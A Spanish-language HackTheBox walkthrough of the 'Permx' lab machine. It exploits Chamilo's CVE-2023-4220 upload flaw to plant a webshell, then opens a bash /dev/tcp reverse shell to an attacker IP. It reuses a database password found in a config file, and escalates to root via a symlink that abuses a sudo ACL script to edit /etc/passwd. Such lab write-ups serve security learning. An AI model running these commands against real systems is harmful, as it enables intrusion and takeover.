+++ 
draft = false
date = 2026-02-14T16:44:24Z
title = "Permx Machine - HackTheBox"
description = "Esta es una máquina de nivel Easy de la plataforma HackTheBox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-------------------------
- Tags: #Machine #Linux #Easy #CVE-2023-4220
----------------

# Introducción

Esta es una máquina Linux que aloja un servidor web en la cual, después de realizar _fuzzing_ de subdominios, encontramos un login de `Chamilo 1`, el cual es vulnerable a `CVE-2023-4220`, lo que permite RCE mediante la subida de un archivo `PHP` malicioso.  
Una vez dentro de la máquina víctima, al leer los archivos de configuración de la base de datos, encontramos una contraseña en texto plano que es reutilizada por un usuario de bajos privilegios del sistema.  
Posteriormente, al revisar los permisos de `sudo`, encontramos un script que permite cambiar los permisos de archivos dentro de un directorio específico. Mediante un enlace simbólico, somos capaces de modificar permisos de archivos fuera de ese directorio, lo que nos permite escalar privilegios y obtener acceso total al sistema.
# Enumeración Nmap

Realizamos un escaneo de los puertos, encontrando el puerto `80` abierto, que está corriendo el servicio `HTTP`, y el puerto `22`, que corre el servicio `SSH`

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.129.8.242 -oG allPorts
```

Realizamos un escaneo de versiones de los servicios

```bash
nmap -p22,80 -sCV 10.129.8.242 -oN portServices
```

Encontrando que el servicio HTTP nos muestra el dominio de la página web

<img src="/images/Pasted image 20260203175029.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto, lo agregaremos a nuestro `/etc/hosts`

<img src="/images/Pasted image 20260203175113.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración puerto 80

Revisando la página web, no encontramos nada interesante

<img src="/images/Pasted image 20260203175200.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto realizaremos un fuzzing de subdominios, de la siguiente forma

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb/ -H "Host: FUZZ.permx.htb" -fl 10
```

Encontrando dos subdominios: `www`, `lms`.

Por tanto los agregaremos a nuestro `/etc/hosts`

<img src="/images/Pasted image 20260203175443.png" style="width:100%; height:auto; display:block; margin:auto;">

Si vemos el subdominio `www`, vemos que nos lleva a la misma página web anterior, si vamos al subdominio `lms`, encontramos una página de login

<img src="/images/Pasted image 20260203175535.png" style="width:100%; height:auto; display:block; margin:auto;">

La página de login es de `Chamilo`, utilizamos `whatweb`, para ver las tecnologías de este nuevo subdominio

Encontrando aparentemente, que la versión de `Chamilo` es la `1`

<img src="/images/Pasted image 20260203175705.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotando Chamilo 1 CVE-2023-4220

Realizando una pequeña búsqueda de `Chamilo 1 vuln`, nos encontramos las siguientes vulnerabilidades

<img src="/images/Pasted image 20260203175817.png" style="width:100%; height:auto; display:block; margin:auto;">

--------------------------------------------------------------

El `CVE-2023-4220` permite la subida de archivos sin necesitar autenticación, lo cual abre una vía potencial a ejecutar código malicioso mediante una webshell

Para ello se manda una petición POST a la siguiente ruta

```bash
main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported
```

Y agregamos el content type, y el boundary

```bash
Content-Type: multipart/form-data;boundary=---------------------------1234567890
```

-----------------------------------------------------------------

La petición queda como se muestra a continuación

<img src="/images/Pasted image 20260212184506.png" style="width:100%; height:auto; display:block; margin:auto;">

Si vamos a `/main/inc/lib/javascript/bigupload/files/rce.php?cmd=id` podemos ejecutar comandos mediante la webshell

<img src="/images/Pasted image 20260212184559.png" style="width:100%; height:auto; display:block; margin:auto;">

# Consiguiendo shell

Para obtener la shell, vamos a utilizar la siguiente reverse

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.42/4443 0>&1'
```

y la pasamos a `URL-encoded`, quedando de la siguiente manera

```bash
%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%34%32%2f%34%34%34%33%20%30%3e%26%31%27
```

Lo enviamos y obtenemos la shell

<img src="/images/Pasted image 20260212184833.png" style="width:100%; height:auto; display:block; margin:auto;">

# Movimiento lateral

Si volvemos al directorio principal de `Chamilo`, y buscamos la contraseña de la base de datos, con el siguiente comando

```bash
grep -r -i "db_password" 2>/dev/null
```

Encontramos que el archivo `/app/config/configuration.php` muestra una contraseña

<img src="/images/Pasted image 20260212191924.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto lo vemos a más detalle y encontramos las credenciales de la base de datos `chamilo:03F6lY3uXAP2bkW8`

<img src="/images/Pasted image 20260212192043.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora listamos los usuarios existentes en la máquina víctima, encontrando que existen `mtz` y `root`

<img src="/images/Pasted image 20260212192134.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto probamos si se realiza reutilización de contraseñas en alguno de los usuarios, y vemos que el usuario `mtz`, utiliza la misma contraseña que la de la base de datos

<img src="/images/Pasted image 20260212192229.png" style="width:100%; height:auto; display:block; margin:auto;">

Por consecuencia, nos conectaremos por `SSH`, para tener una consola más estable

```bash
ssh mtz@permx.htb
```


<img src="/images/Pasted image 20260212192319.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Si vemos qué comando podemos utilizar con `sudo`, vemos que tenemos permiso para ejecutar el script `/opt/acl.sh`, sin la necesidad de proporcionar contraseña.

<img src="/images/Pasted image 20260212192416.png" style="width:100%; height:auto; display:block; margin:auto;">

Analizando el script, es el siguiente

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

El script, verifica si el archivo se encuentra en el directorio `/home/mtz/`, si está ahí nos permite cambiar los permisos del archivo.

Esto abre una vía potencial de escalada de privilegios, ya que si creamos un enlace simbólico hacia otro archivo, nos permite evadir la regla de que solo nos deja cambiar permisos en nuestro directorio `home`

## Abusando script mal implementado


Para ello crearemos un enlace simbólico de `/etc/passwd`

```bash
ln -s /etc/passwd /home/mtz/passwd
```

Luego ejecutaremos el script de la siguiente manera

```bash
sudo /opt/acl.sh mtz rwx /home/mtz/passwd
```

Ahora editamos el `/etc/passwd`, quitando la `x` que está justo después de `root`

<img src="/images/Pasted image 20260212201213.png" style="width:100%; height:auto; display:block; margin:auto;">

Quedando así como se muestra a continuación

<img src="/images/Pasted image 20260212201246.png" style="width:100%; height:auto; display:block; margin:auto;">

y ahora podemos migrar al usuario `root`, sin proporcionar contraseña

<img src="/images/Pasted image 20260212201311.png" style="width:100%; height:auto; display:block; margin:auto;">

con ello tenemos acceso a la cuenta de privilegios máximos del sistema, por tanto podemos leer las flags, y terminar la máquina.

<img src="/images/Pasted image 20260212201354.png" style="width:100%; height:auto; display:block; margin:auto;">
